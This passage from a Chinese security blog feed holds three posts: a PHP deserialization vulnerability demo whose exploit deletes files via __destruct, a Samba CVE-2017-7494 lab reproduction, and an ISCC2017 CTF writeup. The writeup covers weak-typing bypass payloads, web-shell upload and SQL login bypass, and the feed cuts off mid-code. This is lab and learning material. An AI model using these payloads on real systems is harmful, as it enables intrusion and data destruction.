href="next.php?cart='</span>.urlencode(serialize($shopping)).<span class="string">'"&gt;next&lt;/a&gt;'</span>;</div><div class="line">~</div></pre></td></tr></table></figure><ol><li>序列化对象</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</div><div class="line">    <span class="comment">// 类数据</span></div><div class="line"></div><div class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</div><div class="line">    <span class="keyword">public</span> $name = <span class="string">''</span>;</div><div class="line"></div><div class="line">    <span class="comment">// 输出数据</span></div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">PrintData</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'User '</span> . <span class="keyword">$this</span>-&gt;name . <span class="string">' is '</span> . <span class="keyword">$this</span>-&gt;age</div><div class="line">            . <span class="string">' years old. &lt;br /&gt;'</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// 创建一个对象</span></div><div class="line"></div><div class="line">$usr = <span class="keyword">new</span> User();</div><div class="line"></div><div class="line"><span class="comment">// 设置数据</span></div><div class="line"></div><div class="line">$usr-&gt;age = <span class="number">20</span>;</div><div class="line">$usr-&gt;name = <span class="string">'John'</span>;</div><div class="line"></div><div class="line"><span class="comment">// 输出数据</span></div><div class="line"></div><div class="line">$usr-&gt;PrintData();</div><div class="line"></div><div class="line"><span class="comment">// 输出序列化之后的数据</span></div><div class="line"></div><div class="line"><span class="keyword">echo</span> serialize($usr);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>php允许保存一个对象方便以后重用，这个过程被称为序列化。为什么要有序列化这种机制呢?在传递变量的过程中，有可能遇到变量值要跨脚本文件传递的过程。试想，如果为一个脚本中想要调用之前一个脚本的变量，但是前一个脚本已经执行完毕，所有的变量和内容释放掉了，我们要如何操作呢?难道要前一个脚本不断的循环，等待后面脚本调用?这肯定是不现实的。serialize和unserialize就是用来解决这一问题的。serialize可以将变量转换为字符串，并且在转换中可以保存当前变量的值；unserialize则可以将serialize生成的字符串变换回变量。</p><p>输出</p><blockquote><p>O:4:”User”:2:{s:3:”age”;i:20;s:4:”name”;s:4:”John”;}<br>上面就是对象user序列化之后的形式<br>O表示是对象，4 表示 对象名长度为4，user为对象名</p></blockquote><p> <img src="https://ooo.0o0.ooo/2017/07/02/5958ea2ea508d.jpg" alt=""></p><h3 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h3><p>这个漏洞的形成是由于跟serialize和unserialize相关的magic函数违背正确利用的缘故。<br>比如我在第一个板块的 <strong>sleep()和</strong>wakeup()，分别实在一个对象被序列化和反序列化的时候会被调用。</p><p>根据参考的文章来验证，给出2个php文件。</p><p>logfile.php 删除临时日志文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogFile</span> </span>&#123;</div><div class="line">    <span class="comment">//log文件名</span></div><div class="line">    <span class="keyword">public</span> $filename = <span class="string">'error.log'</span>;</div><div class="line">    <span class="comment">//存储日志文件</span></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">LogData</span><span class="params">($text)</span> </span>&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'Log some data:'</span> . $text . <span class="string">'&lt;br /&gt;'</span>;</div><div class="line">        file_put_contents(<span class="keyword">$this</span>-&gt;filename, $text, FILE_APPEND);</div><div class="line">    &#125;</div><div class="line">    <span class="comment">//Destructor删除日志文件</span></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'__destruct delete'</span> . <span class="keyword">$this</span>-&gt;filename . <span class="string">'file.&lt;br /&gt;'</span>;</div><div class="line">        unlink(dirname(<span class="keyword">__FILE__</span>) . <span class="string">'/'</span> . <span class="keyword">$this</span>-&gt;filename); <span class="comment">//删除当前目录下的filename这个文件</span></div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>包含了’logfile.php’的主页面文件index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">include</span> <span class="string">'logfile.php'</span>;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</div><div class="line">    <span class="comment">//属性</span></div><div class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</div><div class="line">    <span class="keyword">public</span> $name = <span class="string">''</span>;</div><div class="line">    <span class="comment">//调用函数来输出类中属性</span></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">PrintData</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'User'</span> . <span class="keyword">$this</span>-&gt;name . <span class="string">'is'</span> . <span class="keyword">$this</span>-&gt;age . <span class="string">'years old.&lt;br /&gt;'</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">$usr = unserialize($_GET[<span class="string">'user'</span>]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>梳理下这2个php文件的功能，index.php是一个有php序列化漏洞的主业文件，logfile.php的功能就是在临时日志文件被记录了之后调用<br><code>__destruct</code>方法来删除临时日志的一个php文件。<br>这个代码写的有点逻辑漏洞的感觉，利用这个漏洞的方式就是，通过构造能够删除source.txt的序列化字符串，然后get方式传入被反序列化函数,反序列化为对象，对象销毁后调用__destruct()来删除source.txt.</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p> exp.php为漏洞利用程序（为了得到删除source.txt的序列化字符串）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">include</span> <span class="string">'logfile.php'</span>;</div><div class="line">$obj = <span class="keyword">new</span> LogFile();</div><div class="line">$obj-&gt;filename = <span class="string">'source.txt'</span>; <span class="comment">//source.txt为你想删除的文件</span></div><div class="line"><span class="keyword">echo</span> serialize($obj) . <span class="string">'&lt;br /&gt;'</span>;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>生成序列化字符串</p><p>文件夹底下有这么几个文件<br><img src="https://ooo.0o0.ooo/2017/07/02/5958ea48d7675.png" alt=""></p><p>GET传入序列化字符串，调用反序列化函数，这个时候source.txt被删除<br><img src="https://ooo.0o0.ooo/2017/07/02/5958ea576aa34.png" alt=""></p><p>验证<br><img src="https://ooo.0o0.ooo/2017/07/02/5958ea619d961.png" alt=""></p><h4 id="漏洞修补"><a href="#漏洞修补" class="headerlink" title="漏洞修补"></a>漏洞修补</h4><p>由于可以控制的输入造成<strong>destruct()可以删除任意文件，当然</strong>wakeup、<strong>sleep、</strong>toString等magic函数也存在这样的漏洞，这个取决于程序逻辑。<br>怎么修补这种漏洞呢，首先我们得看出这个漏洞形成的<br>必要条件</p><ol><li>unserialize的参数可控</li><li>像上面index.php和logfile.php这样的文件里面有可以利用的magic函数</li><li>我们构造的exp里有对象的成员变量</li></ol><p>这样也导致我们几乎很难在黑盒测试的时候找到并利用这样的漏洞。</p><p>防范方法</p><ol><li>严格控制输入unserialize函数的参数</li><li>对输入的参数进行过滤</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;根据合天实验室上面的实验，我从以前对序列化漏洞的乱七八糟的理解变得清晰起来了。顺便吐槽下最近的自己，没学过java就直接去看struts2的原理性漏洞，头痛。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞" scheme="http://whc.dropsec.xyz/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="漏洞复现" scheme="http://whc.dropsec.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>Samba远程代码执行漏洞（CVE-2017-7494）利用</title>
    <link href="http://whc.dropsec.xyz/2017/06/01/Samba%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-7494%EF%BC%89%E5%88%A9%E7%94%A8/"/>
    <id>http://whc.dropsec.xyz/2017/06/01/Samba远程代码执行漏洞（CVE-2017-7494）利用/</id>
    <published>2017-06-01T07:49:40.000Z</published>
    <updated>2017-06-17T07:57:29.288Z</updated>
    
    <content type="html"><![CDATA[<p>看了网上各位大佬的文章，基本上没有讲原理的。说实话我是个怕麻烦的人，所以就直接在学习怎么利用这个漏洞了，正好专业实训配置服务器是redhat要求配置samba服务，正好偷个懒。</p><a id="more"></a><h3 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h3><p><a href="http://bobao.360.cn/learning/detail/3900.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3900.html</a><br><a href="http://isron.cn/2017/05/30/CVE-2017-7494/" target="_blank" rel="external">http://isron.cn/2017/05/30/CVE-2017-7494/</a></p><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>安全客：Samba是在Linux和UNIX系统上实现SMB协议的一个软件。2017年5月24日Samba发布了4.6.4版本，中间修复了一个严重的远程代码执行漏洞，漏洞编号CVE-2017-7494，漏洞影响了Samba 3.5.0 之后到4.6.4/4.5.10/4.4.14中间的所有版本。360网络安全中心 和 360信息安全部的Gear Team第一时间对该漏洞进行了分析，确认属于严重漏洞，可以造成远程代码执行。</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>我在本地的redhat虚拟机上直接安装redhat镜像Package里面的软件包，<br>正好在影响版本之内<br><img src="https://ooo.0o0.ooo/2017/06/17/5944e094a62b4.png" alt=""></p><p>还有一个搭建环境的方法就是直接用VulApps搭建好的靶场</p><blockquote><p>docker pull medicean/vulapps:s_samba_1<br>docker run -d -p 445:445 -p 139:139 -p 138:138 -p 137:137 medicean/vulapps:s_samba_1</p></blockquote><p><img src="https://ooo.0o0.ooo/2017/06/17/5944e0a75128a.png" alt=""></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>攻击机：kali2016<br>靶机：centos7 （docker安装vulapp的samba靶场）</p><p>开启镜像</p><blockquote><p>docker run -d -p 445:445 -p 139:139 -p 138:138 -p 137:137 medicean/vulapps:s_samba_1<br><img src="https://ooo.0o0.ooo/2017/06/17/5944e0b47426e.png" alt=""></p></blockquote><p>在kali的msf<br><img src="https://ooo.0o0.ooo/2017/06/17/5944e0cc396c1.png" alt=""><br>成功了。。。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;看了网上各位大佬的文章，基本上没有讲原理的。说实话我是个怕麻烦的人，所以就直接在学习怎么利用这个漏洞了，正好专业实训配置服务器是redhat要求配置samba服务，正好偷个懒。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞" scheme="http://whc.dropsec.xyz/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="漏洞复现" scheme="http://whc.dropsec.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>ISCC2017部分题WriteUp</title>
    <link href="http://whc.dropsec.xyz/2017/05/29/ISCC2017%E9%83%A8%E5%88%86%E9%A2%98WriteUp/"/>
    <id>http://whc.dropsec.xyz/2017/05/29/ISCC2017部分题WriteUp/</id>
    <published>2017-05-29T12:21:22.000Z</published>
    <updated>2017-06-16T00:15:31.836Z</updated>
    
    <content type="html"><![CDATA[<p>ISCC这次的题目除了那道jpg和txt的题目是真的有意思，其他的题目感觉差点“意思”。<br><a id="more"></a></p><h3 id="00x1-Web签到题，来和我换flag啊！"><a href="#00x1-Web签到题，来和我换flag啊！" class="headerlink" title="00x1 Web签到题，来和我换flag啊！"></a>00x1 Web签到题，来和我换flag啊！</h3><p><img src="https://ooo.0o0.ooo/2017/06/15/59427caf7739d.png" alt=""></p><h3 id="00x2-WelcomeToMySQL"><a href="#00x2-WelcomeToMySQL" class="headerlink" title="00x2 WelcomeToMySQL"></a>00x2 WelcomeToMySQL</h3><p>源码<br>hint:$servername,$username,$password,$db,$tb is set in ../base.php<br>上传pht，连上菜刀，查看目录底下的base.php为数据库密码<br>连上数据库，查看flag的字段。<br><img src="https://ooo.0o0.ooo/2017/06/15/59427cc21f6c6.png" alt=""></p><h3 id="00x3-我们一起来日站"><a href="#00x3-我们一起来日站" class="headerlink" title="00x3 我们一起来日站"></a>00x3 我们一起来日站</h3><p>扫目录，robots.txt<br><img src="https://ooo.0o0.ooo/2017/06/15/59427cd57f4fd.png" alt=""><br>再扫描/2   那个很长的目录，看见后台。<br><img src="https://ooo.0o0.ooo/2017/06/15/59427ce434c79.png" alt=""><br>这边有点小问题，按照万能密码的特性，这个应该不用输入第二个 ，猜测他的sql语句，username和password分开，没有用and连接</p><h3 id="00x4-自相矛盾"><a href="#00x4-自相矛盾" class="headerlink" title="00x4 自相矛盾"></a>00x4 自相矛盾</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$v1 = <span class="number">0</span>;</div><div class="line">$v2 = <span class="number">0</span>;</div><div class="line">$v3 = <span class="number">0</span>;</div><div class="line"></div><div class="line">$a = (<span class="keyword">array</span>) json_decode(@$_GET[<span class="string">'iscc'</span>]);</div><div class="line"></div><div class="line"><span class="keyword">if</span> (is_array($a)) &#123;</div><div class="line">    is_numeric(@$a[<span class="string">"bar1"</span>]) ? <span class="keyword">die</span>(<span class="string">"nope"</span>) : <span class="keyword">NULL</span>; <span class="comment">//输入数字2017e就变成不是数字型数字了</span></div><div class="line">    <span class="keyword">if</span> (@$a[<span class="string">"bar1"</span>]) &#123;</div><div class="line">        ($a[<span class="string">"bar1"</span>] &gt; <span class="number">2016</span>) ? $v1 = <span class="number">1</span> : <span class="keyword">NULL</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (is_array(@$a[<span class="string">"bar2"</span>])) &#123;</div><div class="line"><span class="comment">//判断是否是array</span></div><div class="line">        <span class="keyword">if</span> (count($a[<span class="string">"bar2"</span>]) !== <span class="number">5</span> <span class="keyword">OR</span> !is_array($a[<span class="string">"bar2"</span>][<span class="number">0</span>])) &#123;</div><div class="line">            <span class="comment">//判断数组个数或者第0位是否为数组</span></div><div class="line">            <span class="keyword">die</span>(<span class="string">"nope"</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        $pos = array_search(<span class="string">"nudt"</span>, $a[<span class="string">"bar2"</span>]); <span class="comment">//搜索是否存在value是nudt的</span></div><div class="line">        $pos === <span class="keyword">false</span> ? <span class="keyword">die</span>(<span class="string">"nope"</span>) : <span class="keyword">NULL</span>;</div><div class="line">        <span class="keyword">foreach</span> ($a[<span class="string">"bar2"</span>] <span class="keyword">as</span> $key =&gt; $val) &#123;</div><div class="line">            $val === <span class="string">"nudt"</span> ? <span class="keyword">die</span>(<span class="string">"nope"</span>) : <span class="keyword">NULL</span>;</div><div class="line">        &#125;</div><div class="line">        $v2 = <span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">$c = @$_GET[<span class="string">'cat'</span>];</div><div class="line">$d = @$_GET[<span class="string">'dog'</span>];</div><div class="line"><span class="keyword">if</span> (@$c[<span class="number">1</span>]) &#123;</div><div class="line">    <span class="keyword">if</span> (!strcmp($c[<span class="number">1</span>], $d) &amp;&amp; $c[<span class="number">1</span>] !== $d) &#123;</div><div class="line"></div><div class="line">        eregi(<span class="string">"3|1|c"</span>, $d . $c[<span class="number">0</span>]) ? <span class="keyword">die</span>(<span class="string">"nope"</span>) : <span class="keyword">NULL</span>;</div><div class="line">        strpos(($c[<span class="number">0</span>] . $d), <span class="string">"isccctf2017"</span>) ? $v3 = <span class="number">1</span> : <span class="keyword">NULL</span>;</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line">var_dump($v1, $v2, $v3);</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>这道题目的意思是要让$v1，$v2，$v3的值都为1时，输出flag。<br>GET方式传入的是一个json。需要绕过好几个点，第一个点，需要判断的是$a[bar1]是否是数字型字符串，不是的话进入下一步，并且判断是否&gt;2016，是的话$v1=1，这个自相矛盾了。输入2017a利用PHP弱类型的类型转换就可以绕过。<br>第二个点是他给的代码感觉有点绕，$a[bar2]首先必须是a[4]元素必须有5个，并且第0位必须也为数组（数组套数组）,否则输出“nope”。然后是$a[bar2]里面不能有“nubt”这个字符串，下面的if判断里面，遍历bar2这个数组，里面要有“nubt”，否则输出“nope”，这个叶子向矛盾了，所以又要利用到PHP弱类型的，0=任意字符，让$v2=1的方法就是$a[bar2]=[[],2,3,4,0]。<br>第三个点，判断$c[1]跟$d是否长度一致并且是否相等，这个可以用array型和string型比较返回NULL来绕过，进入条件语句， $d加上$c[0]中必须要有3或1或c，可以用%00截断来绕过，最后绕过strops()，必须返回1，所以可以这么构造。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat[1][]=1&amp;dog=%00&amp;cat[0]=0isccctf2017</div></pre></td></tr></table></figure></p><p>最终payload为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">iscc=&#123;&quot;bar1&quot;:&quot;2017g&quot;,&quot;bar2&quot;:[[1],2,3,4,0]&#125;&amp;cat[1][]=1&amp;dog=%00&amp;cat[0]=0isccctf2017</div></pre></td></tr></table></figure></p><p>这道题就是综合考察PHP弱类型的，本来对这个弱类型了解的也不太多，然后今天回想这道题目的时候就查到一篇文章，<a href="http://www.am0s.com/ctf/128.html?utm_source=tuicool&amp;utm_medium=referral" target="_blank" rel="external">PHP黑魔法</a><br>知识点总结的很好。</p><h3 id="00x5-I-have-a-jpg-i-upload-a-txt"><a href="#00x5-I-have-a-jpg-i-upload-a-txt" class="headerlink" title="00x5 I have a jpg,i upload a txt."></a>00x5 I have a jpg,i upload a txt.</h3><p>题目忘了，但是还好有题目描述，<br>题目描述：<br>小明发现，php将上传的jpg文件流写入一个txt中，再重命名后缀为jpg还可以正常读取，于是写了一段上传代码，会不会有什么漏洞呢？</p><p>代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">include</span> <span class="string">'hanshu.php'</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'do'</span>])) &#123;</div><div class="line">    $do = $_GET[<span class="string">'do'</span>];</div><div class="line">    <span class="keyword">if</span> ($do == upload) <span class="comment">//如果do内容是upload</span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($_FILES)) &#123;</div><div class="line"><span class="comment">//文件流不存在东西就出现上传目录</span></div><div class="line">            <span class="comment">//文件上传页面</span></div><div class="line">            $html1 = <span class="string">&lt;&lt;&lt;HTML1</span></div><div class="line"><span class="string">            &lt;form action="index.php?do=upload" method="post" enctype="multipart/form-data"&gt;</span></div><div class="line"><span class="string">            &lt;input type="file" name="filename"&gt;</span></div><div class="line"><span class="string">            &lt;input type="submit" value="upload"&gt;</span></div><div class="line"><span class="string">            &lt;/form&gt;</span></div><div class="line"><span class="string">HTML1;</span></div><div class="line">            <span class="keyword">echo</span> $html1;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            $file = @file_get_contents($_FILES[<span class="string">"filename"</span>][<span class="string">"tmp_name"</span>]);</div><div class="line">            <span class="keyword">if</span> (<span class="keyword">empty</span>($file)) &#123;</div><div class="line">                <span class="keyword">die</span>(<span class="string">'do you upload a file?'</span>);</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                <span class="keyword">if</span> ((strpos($file, <span class="string">'&lt;?'</span>) &gt; <span class="number">-1</span>) || (strpos($file, <span class="string">'?&gt;'</span>) &gt; <span class="number">-1</span>) || (stripos($file, <span class="string">'php'</span>) &gt; <span class="number">-1</span>) || (stripos($file, <span class="string">'&lt;script'</span>) &gt; <span class="number">-1</span>) || (stripos($file, <span class="string">'&lt;/script'</span>) &gt; <span class="number">-1</span>)) &#123;</div><div class="line"><span class="comment">//检测上传的file是否存在php和&lt;script&gt;的脚本</span></div><div class="line">                    <span class="keyword">die</span>(<span class="string">'you can\' upload this!'</span>);</div><div class="line">                &#125; <span class="keyword">else</span> &#123;</div><div class="line">                    <span class="comment">//上传不存在上述脚本变量的就变成txt放入随机生成的目录里</span></div><div class="line">                    $rand = mt_rand();</div><div class="line">                    $path = <span class="string">'/var/www/html/web-03/uploads/'</span> . $rand . <span class="string">'.txt'</span>;</div><div class="line">                    file_put_contents($path, $file);</div><div class="line">                    <span class="keyword">echo</span> <span class="string">'your upload success!./uploads/'</span> . $rand . <span class="string">'.txt'</span>;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">        &#125;</div><div class="line"></div><div class="line">    &#125; <span class="keyword">elseif</span> ($do == rename) &#123;</div><div class="line"><span class="comment">//如果do内容是rename</span></div><div class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'re'</span>])) &#123;</div><div class="line">            $re = $_GET[<span class="string">'re'</span>];</div><div class="line">            $re2 = @unserialize(base64_decode(unKaIsA($re, <span class="number">6</span>))); <span class="comment">//就是将下面KaISA的复杂数组值传入</span></div><div class="line">            <span class="keyword">if</span> (is_array($re2)) &#123;</div><div class="line">                <span class="keyword">if</span> (count($re2) == <span class="number">2</span>) &#123;</div><div class="line"><span class="comment">//判断数组个数</span></div><div class="line">                    $rename = <span class="string">'txt'</span>;</div><div class="line">                    $rand = mt_rand();</div><div class="line">                    $fp = fopen(<span class="string">'./uploads/'</span> . $rand . <span class="string">'.txt'</span>, <span class="string">'w'</span>);</div><div class="line">                    <span class="keyword">foreach</span> ($re2 <span class="keyword">as</span> $key =&gt; $value) &#123;</div><div class="line">                        <span class="comment">//遍历re2</span></div><div class="line">                        <span class="keyword">if</span> ($key == <span class="number">0</span>) &#123;</div><div class="line">                            <span class="comment">//$re2数组中第0位元素，那么 rename值就变成$value</span></div><div class="line">                            $rename = $value;</div><div class="line">                        &#125; <span class="keyword">else</span> &#123;</div><div class="line">                            <span class="keyword">if</span> (file_exists(<span class="string">'./uploads/'</span> . $value . <span class="string">'.txt'</span>) &amp;&amp; is_numeric($value)) &#123;</div><div class="line">                                <span class="comment">//如果存在rename表单里面输入的$value.txt并且值为数字型字符串</span></div><div class="line">                                $file = file_get_contents(<span class="string">'./uploads/'</span> . $value . <span class="string">'.txt'</span>); <span class="comment">//将文件写入字符串</span></div><div class="line">                                fwrite($fp, $file); <span class="comment">//写入文件</span></div><div class="line">                            &#125;</div><div class="line">                        &#125;</div><div class="line">                    &#125;</div><div class="line">                    fclose($fp);</div><div class="line">                    waf($rand, $rename);</div><div class="line">                    rename(<span class="string">'./uploads/'</span> . $rand . <span class="string">'.txt'</span>, <span class="string">'./uploads/'</span> . $rand . <span class="string">'.'</span> . $rename);</div><div class="line">                    <span class="keyword">echo</span> <span class="string">"you success rename!./uploads/$rand.$rename"</span>;</div><div class="line">                &#125;</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                <span class="keyword">echo</span> <span class="string">'please not hack me!'</span>;</div><div class="line">            &#125;</div><div class="line">        &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>($_POST[<span class="string">'filetype'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'filename'</span>])) &#123;</div><div class="line">            $filetype = $_POST[<span class="string">'filetype'</span>];</div><div class="line">            $filename = $_POST[<span class="string">'filename'</span>];</div><div class="line">            <span class="keyword">if</span> ((($filetype == <span class="string">'jpg'</span>) || ($filetype == <span class="string">'png'</span>) || ($filetype == <span class="string">'gif'</span>)) &amp;&amp; is_numeric($filename)) &#123;</div><div class="line">                $re = KaIsA(base64_encode(serialize(<span class="keyword">array</span>($filetype, $filename))), <span class="number">6</span>); <span class="comment">// 序列化filetype，filename数组，base64编码再凯撒6位</span></div><div class="line">                var_dump(serialize(<span class="keyword">array</span>($filetype, $filename)));</div><div class="line">                var_dump(base64_encode(serialize(<span class="keyword">array</span>($filetype, $filename))));</div><div class="line">                header(<span class="string">"Location:index.php?do=rename&amp;re=$re"</span>);</div><div class="line">                <span class="keyword">exit</span>();</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                <span class="keyword">echo</span> <span class="string">'you do something wrong'</span>;</div><div class="line">            &#125;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            $html2 = <span class="string">&lt;&lt;&lt;HTML2</span></div><div class="line"><span class="string">            &lt;form action="index.php?do=rename" method="post"&gt;</span></div><div class="line"><span class="string">filetype: &lt;input type="text" name="filetype" /&gt; please input the your file's type</span></div><div class="line"><span class="string">&lt;/br&gt;</span></div><div class="line"><span class="string">filename: &lt;input type="text" name="filename" /&gt; please input your file's numeric name,like 12345678</span></div><div class="line"><span class="string">&lt;/br&gt;</span></div><div class="line"><span class="string">&lt;input type="submit" /&gt;</span></div><div class="line"><span class="string">&lt;/form&gt;</span></div><div class="line"><span class="string">HTML2;</span></div><div class="line">            <span class="keyword">echo</span> $html2;</div><div class="line"></div><div class="line">        &#125;</div><div class="line">    